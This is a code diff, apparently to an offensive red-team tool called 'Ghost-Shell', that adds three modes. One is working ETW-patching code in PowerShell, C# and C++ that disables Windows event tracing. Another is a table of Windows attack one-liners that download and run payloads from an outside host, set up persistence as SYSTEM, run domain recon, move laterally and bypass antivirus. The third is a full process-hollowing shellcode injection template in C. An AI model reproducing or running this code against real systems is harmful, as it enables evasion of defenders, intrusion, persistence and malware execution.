@@ -43,7 +43,7 @@ try:
 except ImportError:
     pass
 
-VERSAO = "2.1.0"
+VERSAO = "2.2.0"
 
 
 def _build_banner():
@@ -107,7 +107,8 @@ def _build_banner():
         f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
         f"{D}{hl}{X}",
         f"{D}gen  webshell  encode  list  macro  amsi{X}",
-        f"{D}xor  obfuscate  c2  listen{X}",
+        f"{D}xor  obfuscate  c2  listen  shellcode  staged{X}",
+        f"{D}etw  lolbas  hollow  c2docker{X}",
         f"{D}bash  ps1  php  perl  ruby  go  java  awk{X}",
     ]
 
@@ -1028,6 +1029,307 @@ def gerar_macro(tipo, ip, porta, linguagem="powershell", raw_cmd=None):
 # ==============================================================================
 # Shellcode Encoder
 # ==============================================================================
+# ETW PATCH
+# ==============================================================================
+
+def gerar_etw_patch(linguagem="powershell"):
+    """Gera codigo para desabilitar Event Tracing for Windows (ETW) para evasao."""
+    patches = {
+        "powershell": {
+            "desc": "Patch ETW via reflection em PowerShell (desabilita EtwEventWrite)",
+            "code": r"""# ETW Patch - PowerShell
+$EtwEventWrite = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() | Join-Path -ChildPath "clr.dll" | Get-Item
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class EtwPatch {
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
+}
+"@
+$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
+$addr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
+$dummy = 0
+[EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$dummy) | Out-Null
+[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)  # RET
+Write-Host "[+] ETW desabilitado"
+""",
+        },
+        "csharp": {
+            "desc": "Patch ETW em C# via PInvoke (EtwEventWrite -> RET)",
+            "code": r"""// ETW Patch - C#
+using System;
+using System.Runtime.InteropServices;
+
+class EtwPatch {
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] static extern IntPtr LoadLibraryA(string l);
+    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint fl, out uint old);
+
+    static void PatchEtw() {
+        IntPtr ntdll = LoadLibraryA("ntdll.dll");
+        IntPtr addr  = GetProcAddress(ntdll, "EtwEventWrite");
+        uint oldProt;
+        VirtualProtect(addr, 1, 0x40, out oldProt);
+        Marshal.WriteByte(addr, 0xC3); // RET
+        VirtualProtect(addr, 1, oldProt, out oldProt);
+        Console.WriteLine("[+] ETW patched");
+    }
+}
+""",
+        },
+        "cpp": {
+            "desc": "Patch ETW em C++ inline (EtwEventWrite -> NOP / RET)",
+            "code": r"""// ETW Patch - C++
+#include <windows.h>
+#include <stdio.h>
+
+void PatchEtw() {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    FARPROC addr  = GetProcAddress(ntdll, "EtwEventWrite");
+    DWORD oldProt;
+    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProt);
+    *(BYTE*)addr = 0xC3; // RET
+    VirtualProtect(addr, 1, oldProt, &oldProt);
+    printf("[+] ETW patched\n");
+}
+""",
+        },
+    }
+
+    if linguagem not in patches:
+        _log(f"Linguagem invalida. Opcoes: {', '.join(patches)}", "ERRO")
+        return
+
+    p = patches[linguagem]
+    _secao(f"ETW PATCH ({linguagem.upper()})")
+    _log(p["desc"], "INFO")
+    print(f"\n{C['G']}{p['code']}{C['X']}\n")
+    _log("Este patch modifica memoria em runtime - use somente em ambientes autorizados.", "ALERTA")
+    return p["code"]
+
+
+# ==============================================================================
+# LOLBAS (Living Off the Land Binaries and Scripts)
+# ==============================================================================
+
+LOLBAS_DB = {
+    "download": [
+        ("certutil",   "certutil.exe -urlcache -split -f http://IP/file.exe C:\\Windows\\Temp\\file.exe",
+         "Download via certutil (bloqueado em alguns EDRs)"),
+        ("bitsadmin",  "bitsadmin /transfer job /download /priority high http://IP/file.exe C:\\Temp\\file.exe",
+         "Download via BITS (backgroundintelligent transfer)"),
+        ("powershell", "(New-Object Net.WebClient).DownloadFile('http://IP/file.exe','C:\\Temp\\f.exe')",
+         "Download via PowerShell WebClient"),
+        ("curl",       "curl http://IP/file.exe -o C:\\Temp\\file.exe",
+         "Download via curl (Windows 10+)"),
+        ("wget",       "Invoke-WebRequest -Uri http://IP/file.exe -OutFile C:\\Temp\\file.exe",
+         "Download via Invoke-WebRequest (alias wget no PS)"),
+        ("mshta",      "mshta http://IP/payload.hta",
+         "Executa HTA remotamente via mshta"),
+        ("regsvr32",   "regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll",
+         "Executa COM scriptlet remoto (squiblydoo)"),
+        ("wmic",       "wmic process call create \"cmd /c certutil -urlcache -f http://IP/x.exe x.exe && x.exe\"",
+         "Executa comando via WMI"),
+    ],
+    "exec": [
+        ("rundll32",   "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";eval(...)",
+         "Executa JS via rundll32 (LOLBAS classico)"),
+        ("msbuild",    "msbuild.exe C:\\Temp\\build.xml",
+         "Executa codigo C# inline via MSBuild (bypass AppLocker)"),
+        ("installutil","C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
+         "Executa payload via InstallUtil (bypass AppLocker)"),
+        ("regasm",     "regasm.exe payload.dll",
+         "Executa DLL .NET via regasm (bypass AppLocker)"),
+        ("csc",        "csc.exe /out:C:\\Temp\\x.exe C:\\Temp\\x.cs && C:\\Temp\\x.exe",
+         "Compila e executa C# inline"),
+        ("wscript",    "wscript //e:jscript payload.txt",
+         "Executa JScript via wscript com extensao falsa"),
+        ("cmstp",      "cmstp.exe /s /ns C:\\Temp\\cmstp.inf",
+         "Executa payload via CMSTP (bypass UAC + AppLocker)"),
+        ("forfiles",   "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c payload.exe\"",
+         "Executa via forfiles"),
+    ],
+    "persist": [
+        ("schtasks",   "schtasks /create /tn GhostTask /tr C:\\Temp\\payload.exe /sc onlogon /ru System",
+         "Persistencia via schtask rodando como SYSTEM"),
+        ("reg",        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Ghost /t REG_SZ /d C:\\Temp\\payload.exe",
+         "Persistencia via Run key no registro"),
+        ("wmic_persist","wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE...",
+         "Persistencia via WMI event subscription"),
+        ("sc",         "sc create GhostSvc binPath= C:\\Temp\\payload.exe start= auto && sc start GhostSvc",
+         "Persistencia via servico Windows"),
+    ],
+    "recon": [
+        ("nltest",     "nltest /domain_trusts && nltest /dclist:DOMAIN",
+         "Enumera dominios e DCs confiados"),
+        ("net",        "net user /domain && net group \"Domain Admins\" /domain",
+         "Enumera usuarios e grupos AD"),
+        ("whoami",     "whoami /all && whoami /groups",
+         "Privilegios e grupos do usuario atual"),
+        ("quser",      "quser && query session",
+         "Lista sessoes de usuario ativas (RDP, console)"),
+        ("arp",        "arp -a && ipconfig /all",
+         "Tabela ARP e interfaces de rede"),
+        ("netstat",    "netstat -anob",
+         "Conexoes abertas com PIDs"),
+        ("tasklist",   "tasklist /v /fo csv",
+         "Processos em execucao"),
+        ("reg_creds",  "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\WDigest /v UseLogonCredential",
+         "Verifica se WDigest esta habilitado (credenciais em memoria)"),
+    ],
+    "lateral": [
+        ("wmiexec",    "wmic /node:TARGET /user:DOMAIN\\USER process call create \"cmd /c whoami > C:\\out.txt\"",
+         "Execucao remota via WMI"),
+        ("psexec_lol", "copy payload.exe \\\\TARGET\\C$\\Windows\\Temp\\ && sc \\\\TARGET create svc binPath= ...",
+         "Movimento lateral manual via SMB + sc"),
+        ("winrm",      "Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }",
+         "Execucao remota via WinRM (PS Remoting)"),
+        ("dcom",       "$com=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'))\n$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c payload.exe','7')",
+         "Movimento lateral via DCOM MMC20.Application"),
+    ],
+    "bypass_av": [
+        ("signed_proxy","regsvr32 /s /u /i:PAYLOAD.sct scrobj.dll  # Signed binary proxy exec",
+         "Executa payload via binario assinado Microsoft"),
+        ("env_var",    "set COMSPEC=C:\\Temp\\payload.exe && cmd /c %COMSPEC%",
+         "Substitui COMSPEC para executar payload"),
+        ("alternate_ds","type payload.exe > C:\\Windows\\System32\\calc.exe:payload.exe",
+         "Armazena payload em Alternate Data Stream (ADS)"),
+    ],
+}
+
+def mostrar_lolbas(objetivo="exec"):
+    """Lista binarios nativos do Windows para o objetivo dado (download/exec/persist/recon/lateral/bypass_av)."""
+    objetivos = list(LOLBAS_DB.keys())
+    if objetivo not in LOLBAS_DB:
+        _log(f"Objetivo invalido. Opcoes: {', '.join(objetivos)}", "ERRO")
+        return
+
+    _secao(f"LOLBAS - {objetivo.upper()}")
+    _log(f"Binarios nativos Windows para: {objetivo}", "INFO")
+    print()
+    for nome, cmd, desc in LOLBAS_DB[objetivo]:
+        print(f"  {C['C']}{C['N']}[{nome}]{C['X']} {C['D']}{desc}{C['X']}")
+        print(f"  {C['G']}{cmd}{C['X']}\n")
+
+    _log("Fonte: lolbas-project.github.io - Use apenas em ambientes autorizados.", "ALERTA")
+
+
+# ==============================================================================
+# PROCESS HOLLOWING TEMPLATE
+# ==============================================================================
+
+def gerar_process_hollow():
+    """Gera template C de process hollowing (injecao em processo legitimo)."""
+    _secao("PROCESS HOLLOWING TEMPLATE (C)")
+    _log("Injeta shellcode em processo alvo (ex: notepad.exe) via hollow", "INFO")
+
+    codigo = r"""/*
+ * Process Hollowing - Ghost-Shell Template
+ * By Gh0st-Bx1 | github.com/Ghost-Bx1
+ *
+ * Compile: cl.exe /MT hollow.c Advapi32.lib
+ * Or:      gcc hollow.c -o hollow -lntdll
+ *
+ * Fluxo:
+ *   1. Cria processo alvo suspenso (CreateProcess com CREATE_SUSPENDED)
+ *   2. Lê base address via NtQueryInformationProcess
+ *   3. Unmap do processo alvo (NtUnmapViewOfSection)
+ *   4. Aloca memoria no processo alvo (VirtualAllocEx)
+ *   5. Escreve shellcode (WriteProcessMemory)
+ *   6. Retoma thread (ResumeThread) -> shellcode executa
+ */
+
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+// TODO: substitua por seu shellcode (msfvenom / sliver / custom)
+unsigned char shellcode[] = {
+    0x90, 0x90, 0x90, // NOP sled - substitua aqui
+    0xcc              // INT3 - breakpoint (teste)
+};
+SIZE_T shellcode_len = sizeof(shellcode);
+
+int main() {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+
+    // 1. Criar processo alvo suspenso
+    char target[] = "C:\\Windows\\System32\\notepad.exe";
+    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcess falhou: %d\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Processo criado (suspenso): PID %d\n", pi.dwProcessId);
+
+    // 2. Obter contexto da thread principal
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+
+    // 3. Ler PEB para obter ImageBaseAddress
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
+        GetProcAddress(ntdll, "NtQueryInformationProcess");
+    PROCESS_BASIC_INFORMATION pbi;
+    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
+
+    // Lê ImageBaseAddress do PEB
+    PVOID imageBase;
+    ReadProcessMemory(pi.hProcess,
+        (LPCVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10),
+        &imageBase, sizeof(imageBase), NULL);
+    printf("[+] ImageBase do alvo: %p\n", imageBase);
+
+    // 4. Unmap da imagem original
+    pNtUnmapViewOfSection NtUVS = (pNtUnmapViewOfSection)
+        GetProcAddress(ntdll, "NtUnmapViewOfSection");
+    NtUVS(pi.hProcess, imageBase);
+    printf("[+] Imagem original removida\n");
+
+    // 5. Alocar memoria e escrever shellcode
+    LPVOID base = VirtualAllocEx(pi.hProcess, imageBase,
+        shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base) {
+        printf("[-] VirtualAllocEx falhou: %d\n", GetLastError());
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
+    WriteProcessMemory(pi.hProcess, base, shellcode, shellcode_len, NULL);
+    printf("[+] Shellcode escrito em: %p\n", base);
+
+    // 6. Atualizar RIP/EIP para o shellcode e retomar
+#ifdef _WIN64
+    ctx.Rip = (DWORD64)base;
+#else
+    ctx.Eip = (DWORD)base;
+#endif
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+    printf("[+] Thread retomada - shellcode em execucao\n");
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+"""
+    print(f"{C['G']}{codigo}{C['X']}")
+    fname = "hollow.c"
+    with open(fname, "w") as f:
+        f.write(codigo)
+    _log(f"Template salvo: {fname}", "OK")
+    _log("Compile: cl.exe /MT hollow.c  ou  gcc hollow.c -o hollow -lntdll", "INFO")
+    return codigo
+
+
+# ==============================================================================
 
 def gerar_shellcode_encoder(shellcode_hex: str, arch: str = "auto", chave: int = None):
     """XOR-encode raw shellcode (hex string) e gera stubs em C, Python3 e C#."""
@@ -1430,6 +1732,19 @@ def main():
     p_c2d.add_argument("--framework", choices=["sliver", "havoc"], default="sliver",
                        help="Framework C2 (padrao: sliver)")
 
+    # Modo ETW
+    p_etw = sub.add_parser("etw", help="Gerar codigo para desabilitar ETW (Event Tracing for Windows)")
+    p_etw.add_argument("--lang", choices=["powershell", "csharp", "cpp"], default="powershell",
+                       help="Linguagem do patch (padrao: powershell)")
+
+    # Modo LOLBAS
+    p_lol = sub.add_parser("lolbas", help="Binarios nativos Windows para o objetivo dado (LOLBAS)")
+    p_lol.add_argument("--objetivo", choices=list(LOLBAS_DB.keys()), default="exec",
+                       help=f"Objetivo: {', '.join(LOLBAS_DB.keys())} (padrao: exec)")
+
+    # Modo HOLLOW
+    sub.add_parser("hollow", help="Gerar template C de process hollowing com shellcode injection")
+
     args = parser.parse_args()
 
     if not args.modo:
@@ -1542,8 +1857,18 @@ def main():
     elif args.modo == "c2docker":
         gerar_c2_dockerfile(framework=args.framework)
 
+    elif args.modo == "etw":
+        gerar_etw_patch(linguagem=args.lang)
+
+    elif args.modo == "lolbas":
+        mostrar_lolbas(objetivo=args.objetivo)
+
+    elif args.modo == "hollow":
+        gerar_process_hollow()
+
     print(f"\n  {C['G']}{C['N']}[+] Ghost-Shell finalizado.{C['X']}\n")
 
 
 if __name__ == "__main__":
     main()
+
